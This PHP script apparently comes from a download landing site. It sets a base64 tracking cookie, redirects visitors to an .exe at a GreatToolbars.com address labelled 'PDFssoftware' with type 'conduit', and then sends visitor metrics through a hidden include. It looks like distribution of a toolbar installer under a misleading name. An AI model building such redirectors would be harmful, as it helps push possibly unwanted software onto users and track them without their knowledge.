<?php

$downloadURL = 'http://CT3297959.GreatToolbars.com/exe'; // PDFssoftware

$type = 'conduit';// conduit | sp

function parseFn( $fn ) {
    $fn = realpath($fn);
    $dir = basename( dirname($fn) );
    $dir2 = basename( dirname( dirname($fn) ) );
    $fn = basename($fn, '.php');
    if( $dir == 'download' ) {
        $result =  $fn;
    }
    elseif ( $dir == 'production' || $dir2 == 'vhosts' ) {
        $result = '/'.$fn;
    }
    else {
        $result = $dir.'/'.$fn;
    }
    return $result;
}
function getDomain() {
    if (isset($_SERVER['HTTP_HOST'])) {
        $domain = $_SERVER['HTTP_HOST'];
    }
    else {
        $__dirs = explode(DIRECTORY_SEPARATOR, __FILE__);
        $domain = "";
        while ($__dirs && !$domain) {
            $__comp = array_shift($__dirs);
            if (substr($__comp, -4, 4) == ".com") $domain = $__comp;
        }
        unset($__dirs, $__comp);
    }
    return preg_replace( '/^www\./i', '', $domain );
}
function getTrace( $page, $downloadURL ) {
    if ( isset($_COOKIE['gbastr']) && false !== ($str = base64_decode($_COOKIE['gbastr'])) ) {
        $tr = $str.'-'.$page.':'.$downloadURL.'+_download';
    }
    else {
        $tr = $page.'+direct';
    }

    $tr = str_replace( ":", "#", $tr );
    $tr = str_replace( "/", "$", $tr );

    return $tr;
}

$domain = getDomain();
$page = parseFn( __FILE__ );
$tr = getTrace( $page, $downloadURL );

if ( !empty( $tr ) ) {
    setcookie( "gbastr", base64_encode($tr), time()+3600, '/', ".$domain", false, true );
}

header("Location: $downloadURL");

fastcgi_finish_request();

if ( !empty( $tr ) ) {
    include_once '../gba/.metrics.php';

    sendMetrics( $domain, $tr, $_SERVER['HTTP_USER_AGENT'], 'dn', $type, $_SERVER["HTTP_ACCEPT_LANGUAGE"] );
}